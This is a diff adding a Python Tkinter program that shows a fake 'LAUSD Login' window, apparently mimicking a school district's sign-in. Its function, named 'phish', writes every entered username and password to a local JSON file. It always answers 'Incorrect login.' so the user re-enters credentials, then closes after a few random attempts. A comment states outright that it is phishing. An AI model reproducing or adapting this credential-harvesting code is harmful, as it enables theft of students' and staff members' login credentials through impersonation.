@@ -1,0 +1,55 @@
+from tkinter import *
+from json import loads, dumps
+from codecs import open as copen
+from random import choice, randint
+
+def phish(user, passw, label, root):
+	password = passw.get()
+	passw.delete(0, 'end')
+	label.config(text="Incorrect login.", bg="#FF361C", fg="white")
+	if not len(user) or not len(password):
+		return 0
+	with open("source\\login.json", "r") as f:
+		content = loads(f.read())
+	if user not in content:
+		content[user] = []
+		content[user].append(password)
+		
+	else:
+		if wc.rand:
+			wc.rand -= 1
+			content[user].append(password)
+		else:
+			root.destroy()
+
+	with open("source\\login.json", "w") as f:
+			f.write(dumps(content, indent=4))
+
+def login(): #This is actually a fucking fishing
+	wc.rand = randint(1,3)
+	root = Tk()
+	root.title("Login")
+	root.geometry("{}x{}".format(wc.WIDTH, wc.HEIGHT))
+	mainFrame = Frame(root, bg="#ECF0F1")
+	mainFrame.place(relx=0, rely=0, relwidth=1, relheight=1)
+	login = Canvas(mainFrame, bg="#ECF0F1")
+	login.place(relx=0.3,rely=0,relwidth=0.7,relheight=1)
+	title = Label(login, font=("Courier", 14), bg="#ECF0F1",fg="#FF361C", text="LAUSD Login")
+	title.place(relx=0.3,rely=0.07, relwidth=0.4, relheight=0.2)
+	usrtxt = Label(login, font=("Courier", 11), bg="#ECF0F1", fg="#FF361C", text="User: ")
+	usrtxt.place(relx=0.1, rely=0.3, relwidth=0.16, relheight=0.1)
+	user = Entry(login, font=("Courier", 14))
+	user.place(relx=0.3, rely=0.32, relwidth=0.5, relheight=0.07)
+	pswtxt = Label(login, font=("Courier", 11), bg="#ECF0F1", fg="#FF361C", text="Password:")
+	pswtxt.place(relx=0.1, rely=0.4, relwidth=0.16, relheight=0.1)
+	password = Entry(login, font=("Courier", 14), show="*")
+	password.place(relx=0.3, rely=0.42, relwidth=0.5, relheight=0.07)
+	inc = Label(login, font=("Courier", 15), bg="#ECF0F1", fg="#FF361C", text="")
+	log = Button(login, bg="#FF9433", fg="white", text="LOGIN", command=lambda: phish(user.get(), password, inc, root))
+	log.place(relx=0.65, rely=0.52, relwidth=0.15, relheight=0.1)
+	logocanvas = Canvas(mainFrame, bg="#667BFF")
+	logocanvas.place(relx=0, rely=0, relwidth=0.3,relheight=1)
+	imagecanvas = Canvas(logocanvas, bg="black")      
+	imagecanvas.place(relx=0.04,rely=0.02, width=195, height=195)     
+	img = PhotoImage(file="lmao.png")      
+	imagecanvas.create_image(0.5,0.5,anchor=NW,image=img) 
